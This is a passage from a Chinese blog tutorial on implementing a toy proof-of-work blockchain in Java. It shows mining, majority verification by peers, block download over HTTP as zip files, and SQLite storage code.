class="keyword">if</span> (blocks.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	currentBlock = blocks.get(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (currentBlock == <span class="literal">null</span>) &#123;</span><br><span class="line">	currentBlock = <span class="keyword">new</span> <span class="title class_">Block</span>();</span><br><span class="line">	currentBlock.setBlockHash(<span class="string">&quot;First block hash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Dictionary</span> <span class="variable">diffWorkload</span> <span class="operator">=</span> InitUtils.intiDifficulty();<span class="comment">// 字典表的工作量配置</span></span><br><span class="line"><span class="type">String</span> <span class="variable">maxBlockIndex</span> <span class="operator">=</span> currentBlock.getBlockIndex();</span><br><span class="line"><span class="type">String</span> <span class="variable">nextBlockIndex</span> <span class="operator">=</span> getNextBlockIndex(maxBlockIndex);</span><br><span class="line"><span class="type">Block</span> <span class="variable">block</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Block</span>();</span><br><span class="line"><span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">rand</span> <span class="operator">=</span> String.valueOf(r.nextInt(<span class="number">1000000</span>));</span><br><span class="line">block.setBlockIndex(nextBlockIndex);</span><br><span class="line">block.setCreateTime(time);</span><br><span class="line">block.setWorkLoad(diffWorkload.getValue());</span><br><span class="line">block.setCreateTime(DateUtils.getTime());</span><br><span class="line">block.setPreBlockHash(currentBlock.getBlockHash());</span><br><span class="line">block.setRandomNumber(rand);</span><br><span class="line"><span class="type">Date</span> <span class="variable">runDate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">blockPath</span> <span class="operator">=</span> DataUtils.getBlockPath(nextBlockIndex, runDate);<span class="comment">// gen block file path</span></span><br><span class="line">block.setPath(blockPath);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取出交易</span></span><br><span class="line">List&lt;String&gt; tradeNos = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">List&lt;Pending&gt; list = PendingServiceImpl.queryPendings();</span><br><span class="line"><span class="keyword">if</span> (list.size() != <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">		tradeNos.add(list.get(i).getOrderNo());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">block.setDataJson(list.toString());</span><br></pre></td></tr></table></figure>

<p>定义一个验证规则，作为工作量证明的目标。例如，以哈希运算结果的前缀为4个连续的零为例，将区块体对象的 workString 方法的输出作为输入进行哈希运算，同时使用 workLoad 作为一个随机变量来不断改变运算的结果。</p>
<p>在这个过程中，矿工不断尝试不同的随机值（workLoad），将区块体对象的字符串表示与该随机值进行组合，然后进行哈希运算。他们的目标是找到一个特定的随机值，使得通过哈希运算得到的结果满足一定的条件，例如在结果的前面有4个连续的零。这个过程需要不断尝试不同的随机值，直到找到一个符合条件的结果为止。</p>
<p>这个过程模拟了工作量证明机制，其中矿工需要投入大量的计算资源来不断尝试寻找符合条件的随机值，以获得权利创建新区块。这是一种保障网络安全的机制，因为其他节点需要验证这个随机值是否满足条件，从而确认该区块的有效性。</p>
<p>简单来说就是其他的值都是固定的，只有这个随机数是变动的，所以就只能穷举一直算。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">outHash</span> <span class="operator">=</span> EncryptUtil.encryptSHA256(block.workString());</span><br><span class="line">System.out.println(outHash);</span><br><span class="line"><span class="keyword">if</span> (outHash.startsWith(diffWorkload.getValue())) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;挖到---------------------&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-2-计算结果广播以及工作量验证"><a href="#2-2-计算结果广播以及工作量验证" class="headerlink" title="2.2. 计算结果广播以及工作量验证"></a>2.2. 计算结果广播以及工作量验证</h4><p>计算出答案的人会将结果进行广播，在网络中的人都会接收到区块信息并对接收到的信息进行验证，验证通过就返回true，失败则返回false，当正确的结果超过半数以上时，我们就认为这个节点是最先计算出正确答案的节点，拥有记账权，记录这个新的区块。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">block.setBlockHash(outHash);</span><br><span class="line"><span class="keyword">for</span> (String port : map.getFs().keySet()) &#123;</span><br><span class="line">    <span class="type">Friends</span> <span class="variable">f</span> <span class="operator">=</span> map.getFs().get(port);</span><br><span class="line">    <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> f.getIp();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">resp</span> <span class="operator">=</span> HttpHelper.checkBlock(ip, block);</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>().fromJson(resp, JSONObject.class);</span><br><span class="line">    <span class="keyword">if</span> (response.getCode().equals(<span class="string">&quot;1&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">isTrue</span> <span class="operator">=</span> (Boolean) response.getO();</span><br><span class="line">        <span class="keyword">if</span> (isTrue) &#123;</span><br><span class="line">            trueCount = trueCount + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            falseCount = falseCount + <span class="number">1</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(ip + <span class="string">&quot;失败&quot;</span>);</span><br><span class="line">            map.getFs().get(port).setFriendliness(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> trueCount + falseCount;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isTrueCountMajority</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            isTrueCountMajority = trueCount &gt; (count / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isTrueCountMajority) &#123;</span><br><span class="line">            <span class="comment">//正确结果超过半数以上</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//将新区块记录到区块链中</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>来看下其他节点是怎样验证计算结果的，</p>
<ul>
<li>收到广播的消息后，我们也会对传输的数据进行sha256哈希计算，这一步可以验证交易是否有被篡改过。</li>
<li>然后用传输过来的区块号去本地数据库查询，查看是否已经存在该区块，</li>
<li>查看传输过来的区块是否是当前正在计算的区块</li>
<li>查看区块号是否符合给定的计算条件（例如以0000开头的区块号）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/mining/checkBlock&quot;, method = &#123;RequestMethod.POST&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;JSONObject&gt; <span class="title function_">checkBlock</span><span class="params">(<span class="meta">@RequestBody</span> Block b)</span> &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Dictionary</span> <span class="variable">diffWorkload</span> <span class="operator">=</span> InitUtils.intiDifficulty();<span class="comment">// 字典表的工作量配置</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">blockHash</span> <span class="operator">=</span> EncryptUtil.encryptSHA256(b.workString());</span><br><span class="line">        List&lt;Block&gt; bs = BlockServiceImpl.queryBlockByBlockIndex(b.getBlockIndex());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bs.size() != <span class="number">0</span> || Integer.valueOf(b.getBlockIndex()) - <span class="number">1</span> &lt; UpdateTimer.currentMaxBlockIndex.intValue() || !blockHash.equals(b.getBlockHash()) || !blockHash.startsWith(diffWorkload.getValue())) &#123;</span><br><span class="line">            jo.setO(<span class="literal">false</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            mining.isWork = <span class="literal">false</span>;</span><br><span class="line">            jo.setO(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        jo.setCode(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-3-定时任务每秒向其他节点请求最新区块"><a href="#2-3-定时任务每秒向其他节点请求最新区块" class="headerlink" title="2.3. 定时任务每秒向其他节点请求最新区块"></a>2.3. 定时任务每秒向其他节点请求最新区块</h4><p>我们会通过已经保存的对等节点的ip进行最新区块的获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateBlock</span><span class="params">(String blockIndex, Mining mining, MapFriends map)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">BlockDownLoad</span> <span class="variable">bdl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span>(String port:map.getFs().keySet())&#123;</span><br><span class="line">            Friends f= map.getFs().get(port);</span><br><span class="line">            String ip=f.getIp();</span><br><span class="line">            <span class="keyword">if</span> (f.getFriendliness() == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">NoticeParams</span> <span class="variable">np</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NoticeParams</span>(blockIndex.toString(), ip,<span class="string">&quot;&quot;</span>);</span><br><span class="line">            bdl = HttpHelper.downLoadBlock(ip, <span class="number">8888</span>, np);<span class="comment">//获取区块和区块内容</span></span><br><span class="line">            <span class="keyword">if</span>(bdl == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//检测当前区块是否已经存在</span></span><br><span class="line">            <span class="type">TradeBodyPool</span> <span class="variable">tbp</span> <span class="operator">=</span> BlockBaseUtils.genTbp(bdl);</span><br><span class="line">            List&lt;Block&gt; bs=BlockServiceImpl.queryBlockByBlockIndex(bdl.getBlock().getBlockIndex());</span><br><span class="line">            <span class="keyword">if</span>(bs.size() &gt; <span class="number">0</span> )&#123;</span><br><span class="line">                deletePending(tbp);<span class="comment">//删除pending</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            BlockServiceImpl.checkBlockTable(bdl.getBlock().getBlockIndex());<span class="comment">//检查表是否存在</span></span><br><span class="line"></span><br><span class="line">            BlockServiceImpl.save(bdl.getBlock());<span class="comment">//保存区块DB</span></span><br><span class="line">            BlockServiceImpl.saveBlockFile(bdl);<span class="comment">//保存区块文件</span></span><br><span class="line">            DicServiceImpl.updateDicBlockIndex(blockIndex);<span class="comment">//更新当前更新到的块号</span></span><br><span class="line">            DicServiceImpl.updateDicMainBockIndex(bdl.getMaxBlockIndex());<span class="comment">//更新当前更新到的块号</span></span><br><span class="line">            UpdateTimer.currentBlockIndex= <span class="keyword">new</span> <span class="title class_">BigInteger</span>(blockIndex) ;</span><br><span class="line">            UpdateTimer.currentMaxBlockIndex= <span class="keyword">new</span> <span class="title class_">BigInteger</span>(bdl.getMaxBlockIndex()) ;</span><br><span class="line">            deletePending(tbp);<span class="comment">//删除pending</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(bdl==<span class="literal">null</span>)&#123;</span><br><span class="line">            mining.updateComplete=<span class="literal">true</span>;</span><br><span class="line">            mining.isWork=<span class="literal">true</span>;</span><br><span class="line">            <span class="comment">//已经更新到最高区块</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>下载区块的具体方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> BlockDownLoad <span class="title function_">downLoadBlock</span><span class="params">(String ip, <span class="type">int</span> port, NoticeParams np)</span> &#123;</span><br><span class="line">        <span class="type">BlockDownLoad</span> <span class="variable">bdl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BlockDownLoad</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isNotBlank(ip)) &#123;</span><br><span class="line">            url = <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/mining/server/block.zip&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            url = <span class="string">&quot;http://&quot;</span> + np.getIp() + <span class="string">&quot;:&quot;</span> + <span class="string">&quot;8001&quot;</span> + <span class="string">&quot;/mining/server/block.zip&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// create Httpclient object</span></span><br><span class="line">        <span class="type">CloseableHttpClient</span> <span class="variable">httpClient</span> <span class="operator">=</span> HttpClients.createDefault();</span><br><span class="line">        <span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ZipInputStream</span> <span class="variable">zis</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">HttpPost</span> <span class="variable">httpPost</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Download Block &quot;</span>);</span><br><span class="line">            httpPost = <span class="keyword">new</span> <span class="title class_">HttpPost</span>(url);</span><br><span class="line">            httpPost.setHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/json; charset=utf-8&quot;</span>);</span><br><span class="line">            httpPost.setHeader(<span class="string">&quot;Connection&quot;</span>, <span class="string">&quot;Close&quot;</span>);</span><br><span class="line">            httpPost.addHeader(<span class="string">&quot;Accept-Encoding&quot;</span>, <span class="string">&quot;GZIP&quot;</span>);</span><br><span class="line">            <span class="type">RequestConfig</span> <span class="variable">requestConfig</span> <span class="operator">=</span> RequestConfig.custom().setConnectTimeout(<span class="number">5000</span>).setConnectionRequestTimeout(<span class="number">15000</span>).setSocketTimeout(<span class="number">15000</span>).build();</span><br><span class="line">            httpPost.setConfig(requestConfig);</span><br><span class="line">            <span class="type">StringEntity</span> <span class="variable">entity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringEntity</span>(np.toJSONString(), Charset.forName(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">            entity.setContentEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            entity.setContentType(<span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">            httpPost.setEntity(entity);</span><br><span class="line">            response = httpClient.execute(httpPost);</span><br><span class="line">            <span class="comment">//get zip</span></span><br><span class="line">            zis = <span class="keyword">new</span> <span class="title class_">ZipInputStream</span>(response.getEntity().getContent(), Charset.forName(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">            <span class="type">ZipEntry</span> <span class="variable">ze</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">Block</span> <span class="variable">block</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">blockFileStr</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">maxIndex</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span> ((ze = zis.getNextEntry()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;blockObject&quot;</span>.equals(ze.getName())) &#123;</span><br><span class="line">                    <span class="comment">//区块对象</span></span><br><span class="line">                    block = BlockServiceImpl.getBlockObeject(zis);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;maxblockindex&quot;</span>.equals(ze.getName())) &#123;</span><br><span class="line">                    <span class="comment">//获得最大块编号</span></span><br><span class="line">                    maxIndex = BlockServiceImpl.getMaxBlockIndexStr(zis);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;tokblockfile&quot;</span>.equals(ze.getName())) &#123;</span><br><span class="line">                    <span class="comment">//获得区块文件</span></span><br><span class="line">                    blockFileStr = BlockServiceImpl.getBlockFileStr(zis);</span><br><span class="line">                    System.out.println(blockFileStr);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (block == <span class="literal">null</span> || StringUtils.isBlank(blockFileStr)) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//throw new Exception(&quot;down block is not complete.&quot;);</span></span><br><span class="line">                System.out.println(<span class="string">&quot;当前block为空，无需下载&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            bdl.setBlock(block);</span><br><span class="line">            bdl.setBlockFileStr(blockFileStr);</span><br><span class="line">            bdl.setMaxBlockIndex(maxIndex);</span><br><span class="line">            <span class="keyword">return</span> bdl;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">//e.printStackTrace();</span></span><br><span class="line">            System.out.println(<span class="string">&quot;连接不到对等节点：&quot;</span> + ip);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (httpPost != <span class="literal">null</span>) &#123;</span><br><span class="line">                    httpPost.releaseConnection();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (httpClient != <span class="literal">null</span>) &#123;</span><br><span class="line">                    httpClient.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (response != <span class="literal">null</span>)</span><br><span class="line">                    response.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>读取流代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">bos = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>(); <span class="comment">// 创建一个字节数组输出流</span></span><br><span class="line"><span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">512</span>];     <span class="comment">// 创建一个大小为 512 字节的缓冲区</span></span><br><span class="line"><span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;                       <span class="comment">// 初始化读取长度为 0</span></span><br><span class="line"><span class="keyword">while</span> ((len = zis.read(buffer)) != -<span class="number">1</span>) &#123; <span class="comment">// 当还有数据可读时继续循环</span></span><br><span class="line">    bos.write(buffer, <span class="number">0</span>, len); <span class="comment">// 将已读取的数据写入到字节数组输出流中</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下载区块的接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(value = &quot;/mining/server/block.zip&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">blockdownload</span><span class="params">(HttpServletResponse response, <span class="meta">@RequestBody</span> NoticeParams noticeParams)</span> &#123;</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">responseBody</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ZipOutputStream</span> <span class="variable">zos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            List&lt;Block&gt; bs = BlockServiceImpl.queryBlockByBlockIndex(noticeParams.getBn());</span><br><span class="line">            <span class="type">Block</span> <span class="variable">b</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="keyword">if</span> (bs != <span class="literal">null</span> &amp;&amp; bs.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                b = bs.get(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> (b != <span class="literal">null</span>) &#123;</span><br><span class="line">                    zos = <span class="keyword">new</span> <span class="title class_">ZipOutputStream</span>(response.getOutputStream());</span><br><span class="line">                    <span class="comment">//写入块对象</span></span><br><span class="line">                    zos.putNextEntry(<span class="keyword">new</span> <span class="title class_">ZipEntry</span>(<span class="string">&quot;blockObject&quot;</span>));</span><br><span class="line">                    <span class="type">String</span> <span class="variable">boStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>().toJson(b);</span><br><span class="line">                    <span class="type">byte</span>[] b_str = boStr.getBytes();</span><br><span class="line">                    zos.write(b_str, <span class="number">0</span>, b_str.length);</span><br><span class="line">                    <span class="comment">//写入块文件</span></span><br><span class="line">                    zos.putNextEntry(<span class="keyword">new</span> <span class="title class_">ZipEntry</span>(<span class="string">&quot;tokblockfile&quot;</span>));</span><br><span class="line">                    <span class="type">String</span> <span class="variable">blockString</span> <span class="operator">=</span> DataUtils.getBlockString(DataUtils.getRelativePath(b.getPath()));</span><br><span class="line">                    <span class="type">byte</span>[] bs_str = blockString.getBytes();</span><br><span class="line">                    zos.write(bs_str, <span class="number">0</span>, bs_str.length);</span><br><span class="line">                    <span class="comment">//写入主链上最高的编号</span></span><br><span class="line">                    zos.putNextEntry(<span class="keyword">new</span> <span class="title class_">ZipEntry</span>(<span class="string">&quot;maxblockindex&quot;</span>));</span><br><span class="line">                    <span class="type">Dictionary</span> <span class="variable">dic</span> <span class="operator">=</span> DicServiceImpl.queryDic(Dictionary.MODUAL_BLOCK, Dictionary.CURRENTBLOCKINDEX);</span><br><span class="line">                    <span class="type">byte</span>[] m_str = dic.getValue().getBytes();</span><br><span class="line">                    zos.write(m_str, <span class="number">0</span>, m_str.length);</span><br><span class="line"></span><br><span class="line">                    zos.closeEntry();</span><br><span class="line">                    zos.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.getMessage();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (responseBody != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    responseBody.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.getMessage();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (zos != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    zos.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.getMessage();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-4-数据库的保存以及修改"><a href="#2-4-数据库的保存以及修改" class="headerlink" title="2.4. 数据库的保存以及修改"></a>2.4. 数据库的保存以及修改</h4><p>SQLite操作</p>
<p>（1）保存数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">save</span><span class="params">(Block block)</span> &#123;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">tableIndex</span> <span class="operator">=</span> DataUtils.getBlockSerial(block.getBlockIndex());</span><br><span class="line">        connection = SQLiteHelper.getConnection();</span><br><span class="line">        connection.setAutoCommit(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;insert into [block&quot;</span> + tableIndex + <span class="string">&quot;]([blockIndex],[preBlockHash],[path],[createTime],[blockHash],[randomNumber],[onMingChain]) values(?,?,?,?,?,?,?);&quot;</span>;</span><br><span class="line">        <span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(sql);</span><br><span class="line">        statement.setString(<span class="number">1</span>, block.getBlockIndex() + <span class="string">&quot;&quot;</span>);</span><br><span class="line">        statement.setString(<span class="number">2</span>, block.getPreBlockHash());</span><br><span class="line">        statement.setString(<span class="number">3</span>, block.getPath());</span><br><span class="line">        statement.setString(<span class="number">4</span>, block.getCreateTime());</span><br><span class="line">        statement.setString(<span class="number">5</span>, block.getBlockHash());</span><br><span class="line">        statement.setString(<span class="number">6</span>, block.getRandomNumber());</span><br><span class="line">        statement.setInt(<span class="number">7</span>, <span class="number">1</span>);</span><br><span class="line">        statement.execute();</span><br><span class="line">        connection.commit();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (connection != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                connection.rollback();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e1) &#123;</span><br><span class="line">                e.getMessage();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        e.getMessage();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        SQLiteHelper.close(connection);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（2）修改数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">update</span><span class="params">(Dictionary dic)</span> &#123;</span><br><span class="line">		<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			connection = SQLiteHelper.getConnection();</span><br><span class="line">			connection.setAutoCommit(<span class="literal">false</span>);</span><br><span class="line">			<span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;update [dictionary] set [value] = ? where [module]=? and [key]=?&quot;</span>;</span><br><span class="line">			<span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(sql);</span><br><span class="line">			statement.setString(<span class="number">1</span>, dic.getValue());</span><br><span class="line">			statement.setString(<span class="number">2</span>, dic.getModule());</span><br><span class="line">			statement.setString(<span class="number">3</span>, dic.getKey());</span><br><span class="line">			statement.execute();</span><br><span class="line">			connection.commit();</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			<span class="keyword">if</span>(connection != <span class="literal">null</span>) &#123;</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					connection.rollback();</span><br><span class="line">				&#125; <span class="keyword">catch</span> (SQLException e1) &#123;</span><br><span class="line">					e.getMessage();</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			e.getMessage();</span><br><span class="line"></span><br><span class="line">		&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">			SQLiteHelper.close(connection);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>（3）删除数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">deletePendings</span><span class="params">(List&lt;String&gt; tradeNos)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(tradeNos == <span class="literal">null</span> || tradeNos.size() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            connection = SQLiteHelper.getConnection();</span><br><span class="line">            connection.setAutoCommit(<span class="literal">false</span>);</span><br><span class="line">            <span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(<span class="string">&quot;delete from [pending] 